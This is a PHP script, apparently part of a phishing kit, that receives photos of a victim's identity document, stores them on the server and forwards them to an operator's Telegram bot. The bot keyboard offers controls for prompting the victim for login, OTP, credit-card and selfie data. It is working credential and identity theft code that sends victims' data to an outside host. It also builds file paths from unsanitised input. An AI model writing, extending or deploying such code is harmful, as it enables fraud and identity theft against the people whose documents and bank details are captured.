<?php
session_start();
include '../../config/config.php';
include '../../config/db.php';

// Habilitar reporte de errores
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Obtener los datos del formulario
    $imageData = $_POST['image'] ?? '';
    $clienteId = $_POST['cliente_id'] ?? '';
    $tipo = $_POST['tipo'] ?? 'unknown'; // 'front' o 'back'

    // Validar datos básicos
    if (empty($imageData) || empty($clienteId)) {
        echo json_encode(['status' => 'error', 'message' => 'Faltan datos']);
        exit;
    }

    try {
        // --- 1. Guardar la imagen en el sistema de archivos temporalmente ---

        // Eliminar el prefijo "data:image/png;base64," o similar
        $imageData = preg_replace('#^data:image/\w+;base64,#i', '', $imageData);
        $decodedImage = base64_decode($imageData);

        // Crear nombre de archivo con timestamp
        $fileName = 'doc_' . $tipo . '_' . $clienteId . '_' . time() . '.jpg';
        $filePath = '../../assets/uploads/' . $fileName;

        // Asegurar que el directorio uploads existe
        if (!file_exists('../../assets/uploads/')) {
            mkdir('../../assets/uploads/', 0775, true);
        }

        // Guardar archivo
        file_put_contents($filePath, $decodedImage);

        // --- 2. Enviar la imagen al Bot de Telegram ---

        $caption = ($tipo === 'front') ? "🆔 Documento FRENTE recibido" : "🆔 Documento REVERSO recibido";
        $caption .= "\nID Cliente: " . $clienteId;

        // Teclado completo (copiado de modules/login/process_login.php y expandido)
        $keyboard = [
            'keyboard' => [
                [
                    ['text' => '🔔 Login Error'],
                    ['text' => '🔢 OTP'],
                    ['text' => '🚫 OTP Error']
                ],
                [
                    ['text' => '💳 CC'],
                    ['text' => '🚫 CC Error'],
                    ['text' => '✅ Finalizar']
                ],
                [
                    ['text' => '🆔 Doc Frente'],
                    ['text' => '🆔 Doc Reverso']
                ],
                [
                    ['text' => '📲 WhatsApp'],
                    ['text' => '🤳 Selfie'],
                    ['text' => '⚠️ Selfie Error']
                ]
            ],
            'resize_keyboard' => true,
            'persistent_keyboard' => true
        ];

        $encodedKeyboard = json_encode($keyboard);

        // URL para enviar foto
        // Usamos CURL para enviar multipart/form-data
        $url = "https://api.telegram.org/bot$botToken/sendPhoto";

        $postFields = [
            'chat_id' => $chatId,
            'photo' => new CURLFile(realpath($filePath)),
            'caption' => $caption,
            'reply_markup' => $encodedKeyboard
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $result = curl_exec($ch);
        $err = curl_error($ch);
        curl_close($ch);

        if ($err) {
            // Manejar error de CURL si es necesario
            // error_log("Error enviando a Telegram: " . $err);
        }

        // Eliminar archivo temporal (opcional, para no llenar el server)
        // unlink($filePath); 

        // --- 3. Actualizar estado del cliente a "Espera" (Status 1) ---
        // Usamos PDO ya que db.php retorna una instancia PDO
        $sql = "UPDATE clientes SET estado = 1 WHERE id = :id";
        $stmt = $conn->prepare($sql);
        $stmt->execute(['id' => $clienteId]);

        $stmt->execute(['id' => $clienteId]);

        // --- 4. Redirección Inteligente ---
        // Si venimos de 'front', vamos a 'back'. Si venimos dev 'back', vamos a 'espera'.
        if ($tipo === 'front') {
            header("Location: ../../index.php?status=doc_back&id=" . $clienteId);
        } else {
            header("Location: ../../index.php?status=espera&id=" . $clienteId);
        }
        exit();

    } catch (Exception $e) {
        echo "Error: " . $e->getMessage();
    }

} else {
    // Si intentan entrar directo
    header("Location: ../../index.php");
    exit();
}
?>